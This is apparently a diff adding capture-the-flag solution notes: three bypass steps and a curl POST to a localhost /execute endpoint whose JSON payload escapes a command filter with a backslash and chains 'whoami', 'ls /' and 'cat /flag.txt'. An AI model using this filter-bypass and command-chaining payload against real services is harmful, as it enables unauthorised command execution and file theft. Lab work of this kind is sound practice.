@@ -1,0 +1,6 @@
+1. add json input headers
+2. bypass with \ for command
+3. bypass with pipeline
+
+
+curl -X POST http://localhost:16001/execute -H "Content-Type: application/json" -H "Authorization: Bearer secret-token" -d '{"command":"\\whoami && ls / && cat /flag.txt"}'
